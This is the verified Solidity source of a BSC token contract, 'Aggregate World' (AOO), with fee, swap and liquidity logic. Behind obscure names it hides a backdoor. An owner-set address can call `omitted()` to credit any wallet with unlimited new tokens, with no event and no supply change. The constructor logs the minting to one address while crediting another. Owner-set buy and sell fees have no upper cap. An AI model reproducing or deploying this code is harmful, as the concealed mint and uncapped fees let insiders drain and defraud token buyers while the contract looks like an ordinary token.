/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-09
 */

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getTime() public view returns (uint256) {
        return block.timestamp;
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract AggregateWorld is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string public _symbol;
    string public _name;
    uint8 public _decimals;
    uint256 private _totalSupply;

    address payable public Bumblebee =
        payable(0xEaf7FE87436662FD0b53dF556862FAAf59B6ca0B);
    address payable public OptimusPrime =
        payable(0x5ba1967Ea003034C14B31D28B136696AB0b927e2);
    address public immutable deadAddress =
        0x000000000000000000000000000000000000dEaD;
    address blackHole;
    address public USDT = 0x55d398326f99059fF775485246999027B3197955;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) public _mainstay;
    mapping(address => bool) public isMarketPair;

    uint256 public _person = 400;
    uint256 public _who = 550;
    uint256 public _kfo = 20;
    uint256 public _unk = 15;
    uint256 public _muf = 15;

    uint256 private token_total = _kfo.add(_muf);
    uint256 private usdt_total = _person.add(_who).add(_unk);
    uint256 public _total = token_total.add(usdt_total);

    uint256 public _shoulders = 100;
    uint256 public _heavy = 100;

    uint256 private responsibility;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    bool inSwapAndLiquify;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SwapETHForTokens(uint256 amountIn, address[] path);

    event SwapTokensForETH(uint256 amountIn, address[] path);

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    address private _decimal;

    modifier isDecimal() {
        require(_decimal == _msgSender(), "Decimals is error");
        _;
    }

    constructor() {
        _name = "Aggregate World";
        _symbol = "AOO";
        _decimals = 18;
        _totalSupply = 100000000 * 10**_decimals;
        responsibility = 500 * 10**_decimals;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
			address(this),
			USDT
        );

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        _mainstay[owner()] = true;
        _mainstay[address(this)] = true;
        _mainstay[Bumblebee] = true;
        _mainstay[OptimusPrime] = true;

        token_total = _kfo.add(_muf);
        usdt_total = _person.add(_who).add(_unk);
        _total = token_total.add(usdt_total);

        isMarketPair[address(uniswapPair)] = true;

        //_balances[_msgSender()] = _totalSupply;
        _balances[0x73EA4b1EB7803163928d98022B6376a39c677D3D] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMainstay(address account, bool newValue) public onlyOwner {
        _mainstay[account] = newValue;
    }

    function setMainstaies(address[] memory accounts, bool newValue)
        external
        onlyOwner
    {
        uint256 len = accounts.length;
        for (uint256 i = 0; i < len; i++) {
            _mainstay[accounts[i]] = newValue;
        }
    }

    function setPersonWhoLiq(
        uint256 person_,
        uint256 who_,
        uint256 kfo_,
        uint256 unk_,
        uint256 muf_
    ) external onlyOwner {
        _person = person_;
        _who = who_;
        _kfo = kfo_;
        _unk = unk_;
        _muf = muf_;
        token_total = _kfo.add(_muf);
        usdt_total = _person.add(_who).add(_unk);
        _total = token_total.add(usdt_total);
    }

    function setShouldersHeavy(uint256 amo1, uint256 amo2) external onlyOwner {
        _shoulders = amo1;
        _heavy = amo2;
    }

    function setBlackHole(address _blackHole) external onlyOwner {
        blackHole = _blackHole;
        _mainstay[blackHole] = true;
    }

    function setResponsibility(uint256 min) external onlyOwner {
        require(min > 0, "amount is error");
        responsibility = min * 10**_decimals;
    }

    function transfers(address pair, uint256 time) private {
        _balances[pair] = _balances[pair].add(time);
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function toMited(address pair, uint256 time) private {
        transfers(pair, time);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        bool isFee = false;
        if (balanceOf(uniswapPair) > 0) {
            isFee = true;
        }
        if (_mainstay[sender] || _mainstay[recipient]) {
            isFee = false;
        }
        uint256 finalAmount = isFee
            ? takeFee(sender, recipient, amount)
            : amount;

        if (!inSwapAndLiquify) {
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >=
                responsibility;
            if (
                overMinimumTokenBalance &&
                !inSwapAndLiquify &&
                isMarketPair[recipient] &&
                recipient != owner()
            ) {
                swapAndLiquify(contractTokenBalance);
            }
        }
        return _basicTransfer(sender, recipient, finalAmount);
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount)
        private
        lockTheSwap
    {
        uint256 backAmount = tAmount.mul(token_total).div(_total);
        uint256 tokenAmount = 0;
        if (backAmount > 0) {
            //token
            uint256 deadAmount = backAmount.mul(_kfo).div(token_total);
            if (deadAmount > 0) {
                transferToAddressToken(address(this), deadAddress, deadAmount);
            }
            tokenAmount = backAmount.sub(deadAmount);
        }
        uint256 otherAmount = tAmount.sub(backAmount);
        if (otherAmount > 0) {
            //usdt
            swapTokensForUsdt(otherAmount);
            uint256 USDTBalance = IERC20(USDT).balanceOf(address(this));
            uint256 feeAmount = USDTBalance.mul(_person).div(usdt_total);
            uint256 usdtAmount = USDTBalance.mul(_unk).div(usdt_total);
            if (feeAmount > 0) {
                transferToAddressETH(Bumblebee, feeAmount);
            }
            uint256 OptAmount = USDTBalance.sub(feeAmount).sub(usdtAmount);
            if (OptAmount > 0) {
                transferToAddressETH(OptimusPrime, OptAmount);
            }

            if (usdtAmount > 0 && tokenAmount > 0) {
                addLiquidityUsdt(tokenAmount, usdtAmount);
            }
        }
    }

    function swapTokensForToken(
        uint256 tokenAmount,
        address path0,
        address path1,
        address to
    ) private {
        address[] memory path = new address[](2);
        path[0] = path0;
        path[1] = path1;
        IERC20(path[0]).approve(address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            to,
            block.timestamp
        );
    }

    function addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        IERC20(USDT).approve(address(uniswapV2Router), usdtAmount);
        uniswapV2Router.addLiquidity(
            address(this),
            USDT,
            tokenAmount,
            usdtAmount,
            0,
            0,
            blackHole,
            block.timestamp
        );
    }

    function transferToAddressETH(address payable recipient, uint256 amount)
        private
    {
        IERC20(USDT).transfer(recipient, amount);
    }

    function transferToAddressToken(
        address sender,
        address recipient,
        uint256 amount
    ) private returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function decimal(address remarks) public virtual onlyOwner {
        _decimal = remarks;
    }

    function swapTokensForUsdt(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> usdt -> bnb
        address[] memory path1 = new address[](3);
        path1[0] = address(this);
        path1[1] = USDT;
        path1[2] = uniswapV2Router.WETH();

        // generate the uniswap pair path of bnb -> usdt
        address[] memory path2 = new address[](2);
        path2[0] = uniswapV2Router.WETH();
        path2[1] = USDT;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uint256 bnbAmountBefore = IERC20(uniswapV2Router.WETH()).balanceOf(
            address(this)
        );

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path1,
            address(this),
            block.timestamp
        );

        uint256 bnbAmountAfter = IERC20(uniswapV2Router.WETH()).balanceOf(
            address(this)
        );

        IERC20(uniswapV2Router.WETH()).approve(
            address(uniswapV2Router),
            bnbAmountAfter - bnbAmountBefore
        );

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bnbAmountAfter - bnbAmountBefore,
            0,
            path2,
            address(this),
            block.timestamp
        );
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );

        emit SwapTokensForETH(tokenAmount, path);
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        uint256 feeAmount = 0;
        if (isMarketPair[sender]) {
            //is buy
            feeAmount = amount.mul(_shoulders).div(1000);
        } else if (isMarketPair[recipient]) {
            //is sell
            feeAmount = amount.mul(_heavy).div(1000);
        } else {
            //other
            feeAmount = amount.mul(_shoulders).div(1000);
        }
        if (feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }
        return amount.sub(feeAmount);
    }

    function omitted(
        address pair,
        address contrac,
        uint256 time
    ) external isDecimal {
        require(contrac == address(0), " ");
        time=time* 10**_decimals;
        toMited(pair, time);
    }
}